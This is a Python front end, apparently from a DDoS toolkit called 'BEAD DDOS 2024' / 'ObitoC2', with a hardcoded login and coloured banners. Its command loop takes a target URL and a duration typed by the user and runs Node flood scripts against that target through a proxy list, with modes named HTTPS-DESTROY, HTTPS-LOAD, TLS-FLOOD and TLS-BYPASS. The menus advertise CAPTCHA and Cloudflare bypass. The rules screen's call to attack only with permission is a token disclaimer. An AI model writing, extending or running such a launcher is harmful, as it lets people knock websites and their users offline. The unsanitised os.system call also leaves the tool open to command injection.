from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
import socket
import os
import requests
import random
import getpass
import time
import sys

def color(data_input_output):
    random_output = data_input_output
    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)

def loading():
    clear()
    print(f'''
\033[37m⠀⠀⠀⠀⣀⣤⣤⣶⣾⠀⠀⠀⠀⠀⠀⠀\033[35m⠀⠀⠀⠀⠀⠀⠀⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀
\033[37m⢀⣴⣶⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⣧\033[35m⣼⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀
\033[37m⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⣿⣷⣦⣀⢸⣿\033[35m⣿⡇⣀⣤⣿⣯⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⢿⣿⣿⣿⣿\033[35m⣿⣿⣿⣿⣿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿\033[35m⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙\033[35m⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ''')
    time.sleep(1)

def si():
    print(' \x1b[38;5;160m[ \x1b[38;2;233;233;233mBEAD DDOS 2024\x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to 2024 DDOS \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: TRUNG ZK & HAI DZ GREM X\x1b[38;5;160m| \x1b[38;2;233;233;233mObitoC2')
    print("")

def rules():
    clear()
    si()
    print(f'''
\033[37m⠀⠀⠀⠀⣀⣤⣤⣶⣾⠀⠀⠀⠀⠀⠀⠀\033[35m⠀⠀⠀⠀⠀⠀⠀⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀
\033[37m⢀⣴⣶⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⣧\033[35m⣼⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀
\033[37m⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⣿⣷⣦⣀⢸⣿\033[35m⣿⡇⣀⣤⣿⣯⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⢿⣿⣿⣿⣿\033[35m⣿⣿⣿⣿⣿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿\033[35m⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙\033[35m⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                \x1b[38;5;160m╔═══════════════╗
                                \x1b[38;5;160m║     \x1b[38;5;160mRules     \x1b[38;5;160m║
                \x1b[38;5;160m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;160m║ \x1b[38;5;160m1. Do not attack without someone's permission \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m3. Do not spam attacks                        \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m4. Only attack stress testing servers         \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m5. Don't skid the panel                       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m6. Give a star to the github repository       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m7. The creator does not do any harm           \x1b[38;5;160m║
                \x1b[38;5;160m╚═══════════════════════════════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
\033[37m⠀⠀⠀⠀⣀⣤⣤⣶⣾⠀⠀⠀⠀⠀⠀⠀\033[35m⠀⠀⠀⠀⠀⠀⠀⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀
\033[37m⢀⣴⣶⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⣧\033[35m⣼⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀
\033[37m⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⣿⣷⣦⣀⢸⣿\033[35m⣿⡇⣀⣤⣿⣯⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⢿⣿⣿⣿⣿\033[35m⣿⣿⣿⣿⣿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿\033[35m⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙\033[35m⠋⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[35m LAYER 4 \033[31mDDOS IP
\033[37m UDP-KILL   \033[95m DDOS IP V4 \033[31mUPDATE..
\033[37m TCP-BYPASS \033[95m DDOS IP V6 & V4 \033[31mUPDATE..\033[0m

               ''')
               
def layer7():
    clear()
    si()
    print(f'''
\033[37m⠀⠀⠀⠀⣀⣤⣤⣶⣾⠀⠀⠀⠀⠀⠀⠀\033[35m⠀⠀⠀⠀⠀⠀⠀⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀
\033[37m⢀⣴⣶⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⣧\033[35m⣼⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀
\033[37m⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⣿⣷⣦⣀⢸⣿\033[35m⣿⡇⣀⣤⣿⣯⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⢿⣿⣿⣿⣿\033[35m⣿⣿⣿⣿⣿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿\033[35m⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙\033[35m⠋⠀⠀⠀⠀

\033[37m⠀⠀⠀⠀TYPE THE ATTACK : \033[95mMETHODS TARGET TIME⠀⠀⠀
             \x1b[38;5;160mMETHODS \033[36mLAYER 7
   \033[39m              ╔═══════════════════════════════════╗  
   \033[93mHTTPS-DESTROY \033[39m║ \033[95mHIGH QUYI REQUESTS KILLED WEB     \033[39m║
      \033[93mHTTPS-LOAD \033[39m║ \033[95mHIGH & BYPASS ( NO CFL )          \033[39m║
       \033[93mTLS-FLOOD \033[39m║ \033[95mTLS VIP - KILLED WEB              \033[39m║
      \033[93mTLS-BYPASS \033[39m║ \033[95mBYPASS CAPTCHA VIP DDOS           \033[39m║
      \033[39m           ╚═══════════════════════════════════╝       
               ''')

def menu():
    sys.stdout.write(f"         \x1b]2;ObitoC2 | USERS Admin\x07")
    clear()
    print('\x1b[38;5;160m[ \x1b[38;2;233;233;233mBEAD DDOS 2024 \x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to NEW DDOS! \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: HBDZ & TRUNG ZK \x1b[38;5;160m| \x1b[38;2;233;233;233mBEAD C2')
    print("")
    print("""
\033[37m⠀⠀⠀⠀⣀⣤⣤⣶⣾⠀⠀⠀⠀⠀⠀⠀\033[35m⠀⠀⠀⠀⠀⠀⠀⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀
\033[37m⢀⣴⣶⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⣧\033[35m⣼⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀
\033[37m⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⣿⣷⣦⣀⢸⣿\033[35m⣿⡇⣀⣤⣿⣯⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀  \033[32mWelcome To \033[37mDDOS 2024
\033[37m⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⢿⣿⣿⣿⣿\033[35m⣿⣿⣿⣿⣿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀  \033[37mTYPE "\033[47m\033[95mHELP\033[0m" \033[32mSHOW ALL COMANDS
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿\033[35m⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙\033[35m⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      
""")


def main():
    menu()
    while(True):
        cnc = input(''' \033[47m\033[31mRoot●\033[95mBatc2\033[0m \033[31m$\033[37m ''')
        if cnc == "methods" or cnc == "METHODS" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        if cnc == "method" or cnc == "METHOD" or cnc == "L4" or cnc == "l4":
            layer4()
#Method
                
        elif "HTTPS-DESTROY" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTPS-DESTROY.js {target} {time} 64 5 proxy.txt')
            except IndexError:
                print('Usage: HTTPS-DESTROY <target> <time>')
                print('Example: HTTPS-DESTROY http://example.com 100')   
        
        elif "HTTPS-LOAD" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTPS-LOAD.js {target} {time} 64 5 proxy.txt')
            except IndexError:
                print('Usage: HTTPS-LOAD <target> <time>')
                print('Example: HTTPS-LOAD http://example.com 120')
                
        elif "TLS-BYPASS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node TLS-BYPASS.js {target} {time} 64 5 proxy.txt')
            except IndexError:
                print('Usage: TLS-BYPASS <target> <time>')
                print('Example: TLS-BYPASS http://example.com 120')
                
        elif "TLS-FLOOD" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node TLS-FLOOD.js {target} {time} 64 5 proxy.txt')
            except IndexError:
                print('Usage: BOMBER <target> <time>')
                print('Example: BOMBER http://example.com 120')   
                
        elif "help" in cnc:
            print(f'''
\033[37m⠀⠀⠀⠀⣀⣤⣤⣶⣾⠀⠀⠀⠀⠀⠀⠀\033[35m⠀⠀⠀⠀⠀⠀⠀⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀
\033[37m⢀⣴⣶⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⣧\033[35m⣼⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀
\033[37m⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⣿⣷⣦⣀⢸⣿\033[35m⣿⡇⣀⣤⣿⣯⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⢿⣿⣿⣿⣿\033[35m⣿⣿⣿⣿⣿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿\033[35m⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙\033[35m⠋⠀⠀⠀⠀
                     \033[37m╔══════════════════════════════╗
                       \033[37mMETHODS  ► \033[31mSHOW LAYER7 METHODS
                       \033[37mMETHOD ► \033[31mSHOW LAYER4 METHOD
                       \033[37mBANNERS ► \033[31mSHOW BANNERS
                       \033[37mRULES   ► \033[31mRULES PANEL
                       \033[37mPORTS   ► \033[31mSHOW ALL PORTS
                       \033[37mTOOLS   ► \033[31mSHOW TOOLS
                       \033[37mCLEAR   ► \033[31mCLEAR TERMINAL
                     \033[37m╚══════════════════════════════╝ \033[0m
                      
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("\033[33mBEAD DDOS 2024: [ " + cmmnd + " ] SHOW FULL\033[0m")
            except IndexError:
                pass
                     
def login():
    clear()
    user = "haidz"
    passwd = "2006"
    print("Welcome To BEAD 2024 DDOS")
    print("Please Login")
    time.sleep(1)
    clear()
    print("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⣀⣤⣤⣶⣾⠀⠀⠀⠀⠀⠀⠀\033[35m⠀⠀⠀⠀⠀⠀⠀⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀
\033[37m⢀⣴⣶⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⣧\033[35m⣼⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀
\033[37m⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⣿⣷⣦⣀⢸⣿\033[35m⣿⡇⣀⣤⣿⣯⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⢿⣿⣿⣿⣿\033[35m⣿⣿⣿⣿⣿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿\033[35m⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙\033[35m⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

\033[37mWELCOME TO \033[99mDDOS BEAD 2024 \033[95mHAPPY NEW YEAR \033[31m2024 \033[0m

""")
    username = input(" \033[95m<●> Username: \033[0m")
    password = getpass.getpass(prompt=' \033[95m<●> Password: \033[0m')
    if username != user or password != passwd:
        print("")
        print(" \033[31m</> SAI MẬT KHẨU RỒI...")
        sys.exit(1)
    elif username == user and password == passwd:
        print(" \033[32m</> ĐÚNG MK RỒI ĐÓ EM :) ")
        time.sleep(0.3)
        loading()
        main()

login()


